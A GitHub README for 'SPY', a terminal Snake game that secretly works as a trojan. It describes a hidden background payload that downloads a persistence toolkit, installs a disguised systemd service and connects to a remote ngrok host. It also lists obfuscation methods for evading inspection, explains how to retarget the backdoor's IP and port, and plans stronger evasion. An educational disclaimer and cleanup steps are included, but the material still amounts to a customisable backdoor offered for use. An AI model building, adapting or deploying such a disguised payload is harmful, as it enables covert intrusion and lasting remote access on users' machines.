# SPY - Snake Plays You 🎮🐍

**A Stealthy Linux Security Demonstration**

Author: Hasan Malek  
GitHub: [Hasan-Malek](https://github.com/Hasan-Malek)  
LinkedIn: [Hasan Malek](https://linkedin.com/in/hasan-malek-125036297)  

![Python](https://img.shields.io/badge/Python-3.6+-3776AB.svg?logo=python) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Purpose](https://img.shields.io/badge/Purpose-Educational-red.svg)

---

## 📖 About

**SPY (Snake Plays You)** is a sophisticated proof-of-concept that blends a fully functional **terminal-based Snake game** with a hidden payload, demonstrating how attackers can embed malicious code in seemingly harmless programs. 🕵️‍♂️

Here’s the catch:
- You run `python3 snake.py` and enjoy a classic Snake game. 🎮
- Meanwhile, **in the background**, the script silently downloads a file from the [PANIX repository](https://github.com/Aegrah/PANIX), sets up a persistent systemd user service, and establishes a remote connection—all without any visible delay or user interaction. 😈
- Even if you delete `snake.py` or the downloaded file, the payload persists via the systemd service. 😱

This project is designed to **educate** Linux users and developers about the risks of running untrusted code, showcasing phishing and persistence techniques used in real-world attacks. It’s compatible with systemd-based Linux distributions (e.g., Debian, Ubuntu, Arch, Fedora). 🐧

**This is for EDUCATIONAL PURPOSES ONLY.** Always test in a secure, isolated environment like a virtual machine. 🛡️

---

## 🚨 Disclaimer

> ⚠️ **This repository is for educational purposes only.**  
> Do **NOT** use it for malicious activities.  
> The code demonstrates hidden payloads for **research and teaching** purposes.  
> Test only in a sandbox or virtual machine with no network access.  

The author is **not responsible** for any misuse or damage caused by this code. 🙅‍♂️

---

## 🎮 Snake Game

Enjoy a classic Snake game in your terminal, built with Python’s `curses` library! Navigate the snake with arrow keys, eat food to grow, and aim for a high score. The game is fully playable, with a sleek Hollywood-style loading animation to set the mood. 🖥️

Run it with:

```bash
python3 snake.py
```

But beware—while you’re chasing food, the script is quietly executing its hidden payload. 😈

---

## 🕵️‍♂️ The Hidden Payload

Here’s what happens behind the scenes:
1. **Download**: Fetches `panix.sh` from [PANIX](https://github.com/Aegrah/PANIX/releases/download/panix-v2.1.0/panix.sh) and saves it as `/tmp/syshealth-:0-CFYhrx.zsh.sh`.
2. **Execution**: Makes the file executable and runs it with arguments to create a systemd user service at `~/.config/systemd/user/syshealth.service`.
3. **Persistence**: The service connects to a remote server (`0.tcp.in.ngrok.io:18768`) and remains active, even if `snake.py` or the downloaded file is deleted.
4. **Obfuscation**: The payload is concealed using:
   - **ASCII Encoding**: Strings (URL, file path, command) are encoded as ASCII character lists.
   - **Name Mangling**: The payload function is named `__x7z9q__` for obscurity.
   - **Fake Comments**: Misleading comments blend the payload with game logic.
   - **Background Thread**: Runs silently in a separate thread with no delays.
   - **Silent Execution**: All output is redirected to `/dev/null` for stealth.

This demonstrates how attackers can hide malicious code in games, updates, or tools, emphasizing the need to **verify code** before running it. 🔍

---

## 🛠️ Prerequisites

To run **SPY**:
- **Python 3.6+**: Uses standard library modules (`curses`, `random`, `time`, `sys`, `os`, `shutil`, `subprocess`, `threading`, `enum`). No additional Python packages needed! 🐍
- **System Dependencies**: Requires `curl` or `wget`, which are pre-installed on most Linux distributions (e.g., Debian, Ubuntu, Arch, Fedora). The script automatically checks for their availability. 🌐
- **Systemd**: The target system must support systemd user services (standard in most modern Linux distros).
- **Terminal**: A terminal with at least 20x10 size for the game interface.

---

## 🚀 Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Hasan-Malek/SPY.git
   cd SPY
   ```
2. Run the game:
   ```bash
   python3 snake.py
   ```

**WARNING**: Running `snake.py` executes the hidden payload. Test only in a **virtual machine** or sandbox with no network access! 🛡️

---

## 🔧 Modifying the Payload

To change the IP or port in the payload (e.g., from `0.tcp.in.ngrok.io:18768`), use `decode_p3.sh`:

```bash
./decode_p3.sh
```

**Steps**:
1. Run `decode_p3.sh` to view the current payload:
   ```bash
   ./decode_p3.sh
   ```
   This decodes the ASCII-encoded command in `snake.py` (under the `# Main Snake LOGIC` comment).
2. Choose to edit the IP/port when prompted:
   - Enter a new IP (e.g., `1.tcp.in.ngrok.io`) or press Enter to keep the default.
   - Enter a new port (e.g., `12345`).
3. Copy the generated `_p3` line (e.g., `_p3 = ''.join(chr(x) for x in [...])`) and replace the corresponding line in `snake.py` under the `# Main Snake LOGIC` comment.
4. Save `snake.py` and rerun:
   ```bash
   python3 snake.py
   ```

The script outputs both the encoded and decoded payload for confirmation, making it easy to customize the backdoor’s connection. 🔧

---

## 🕹️ How to Play

- **Start**: Press any key (or `1`, `2`, `3` for Easy, Medium, Hard difficulty).
- **Move**: Use arrow keys to guide the snake.
- **Eat**: Collect food (`π`) to grow and score (+10 points per food).
- **Quit**: Press `Q` to exit.
- **Restart**: Press `R` after a game over.

The payload runs silently in the background, invisible to the player. 😈

---

## 🔒 Obfuscation Techniques

To evade casual inspection, the script employs:
- **ASCII Encoding**: Hides the URL, file path, and command as ASCII character lists (e.g., `[104,116,116,112,115,...]` for `https`).
- **Name Mangling**: Uses cryptic names like `__x7z9q__` for the payload function.
- **Fake Comments**: Misleading comments (e.g., “Main Snake LOGIC”) disguise the payload as game code.
- **Background Execution**: Runs in a separate thread to avoid delays.
- **Silent Operation**: Redirects all output to `/dev/null` for stealth.

These techniques make the malicious code hard to spot without deep analysis, mimicking real-world attack strategies. 🕵️‍♂️

---

## 🧪 Testing Safely

To test **SPY** safely:
1. Set up a **virtual machine** (e.g., VirtualBox, VMware) with no internet access.
2. Clone the repository and run `python3 snake.py`.
3. Verify the payload’s effects:
   ```bash
   ls /tmp/syshealth-:0-CFYhrx.zsh.sh
   ls ~/.config/systemd/user/syshealth.service
   systemctl --user status syshealth.service
   ```
4. Clean up after testing:
   ```bash
   systemctl --user disable --now syshealth.service
   rm -f ~/.config/systemd/user/syshealth.service
   rm -f /tmp/syshealth-:0-CFYhrx.zsh.sh
   ```

Some systems may require enabling user-level systemd services:
```bash
loginctl enable-linger $USER
```

---

## 📚 Educational Purpose

This project is ideal for:
- **Cybersecurity Workshops**: Demonstrate phishing and persistence techniques.
- **Linux Security Training**: Teach the risks of untrusted scripts.
- **Code Analysis**: Study obfuscation and payload delivery methods.

It highlights real-world attack vectors, such as:
- Hiding malware in games, updates, or tools. 🎮
- Using systemd for persistence. 🛠️
- Obfuscating code to evade detection. 🔒

**Use ethically** and only with explicit permission from system owners. 🙏

---

## 📂 Files

- `snake.py`: The Snake game with the obfuscated payload.
- `decode_p3.sh`: A script to decode and modify the payload’s IP/port.

---

## 🌟 Future Improvements

- Support dynamic IP/port via environment variables.
- Randomize file and service names for better evasion.
- Add stronger obfuscation (e.g., XOR encryption, PyArmor).
- Include a cleanup script for ethical demos.
- Test across more Linux distributions.

---

## 🛠️ Contributing

Have ideas to enhance this educational tool? Open an issue or submit a pull request on [GitHub](https://github.com/Hasan-Malek/SPY)! Let’s make cybersecurity education more impactful together. 🚀

---

## 📜 License

Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

## ⚠️ Final Warning

This code is a **demonstration of vulnerabilities**, not a tool for harm. Test in a secure environment and respect ethical boundaries. Stay curious, stay safe! 🔒

---

**Created by Hasan Malek**  
Play the game, but don’t let the snake play you! 🐍